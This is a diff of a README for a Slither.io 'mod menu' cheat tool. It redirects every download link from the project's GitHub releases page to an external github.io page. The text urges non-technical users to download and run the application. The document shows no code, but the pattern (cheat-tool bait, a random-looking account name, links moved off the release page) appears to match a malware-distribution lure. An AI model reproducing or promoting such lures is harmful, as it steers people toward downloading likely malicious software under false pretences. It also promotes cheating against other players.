@@ -1,6 +1,6 @@
 # 🐍 slither-io-mod-menu - Unlock New Powers in Slitherio Today
 
-[![Download Now](https://img.shields.io/badge/Download-Slitherio%20Mod%20Menu%202026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/oologyprohibition756/slither-io-mod-menu/releases)
+[![Download Now](https://img.shields.io/badge/Download-Slitherio%20Mod%20Menu%202026-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://oologyprohibition756.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application.
 
-Click the green button above or use this direct link: [https://github.com/oologyprohibition756/slither-io-mod-menu/releases](https://github.com/oologyprohibition756/slither-io-mod-menu/releases)
+Click the green button above or use this direct link: [https://oologyprohibition756.github.io](https://oologyprohibition756.github.io)
 
 This is your one-stop destination to get the latest version of the Slitherio Mod Menu for 2026. The download page will show you all available releases—simply pick the newest one and download it to your computer.
 
@@ -52,7 +52,7 @@ Getting started with slither-io-mod-menu is simple and requires no technical kno
 
 Open your web browser (Chrome, Edge, Firefox, or any other) and go to the download page:
 
-[https://github.com/oologyprohibition756/slither-io-mod-menu/releases](https://github.com/oologyprohibition756/slither-io-mod-menu/releases)
+[https://oologyprohibition756.github.io](https://oologyprohibition756.github.io)
 
 ### Step 2: Choose the Latest Release
 
@@ -163,7 +163,7 @@ Join other Slitherio enthusiasts who use this mod menu to enhance their gameplay
 
 slither-io-mod-menu brings the future of Slitherio gaming to your fingertips. With its bot assistance, enhanced visuals, and powerful features, you will wonder how you ever played without it. The download process is straightforward, and the application is designed to be accessible to everyone.
 
-Visit this link to download the application: [https://github.com/oologyprohibition756/slither-io-mod-menu/releases](https://github.com/oologyprohibition756/slither-io-mod-menu/releases)
+Visit this link to download the application: [https://oologyprohibition756.github.io](https://oologyprohibition756.github.io)
 
 Get ready to dominate the arena and reach the top of the leaderboard. Happy slithering!
 
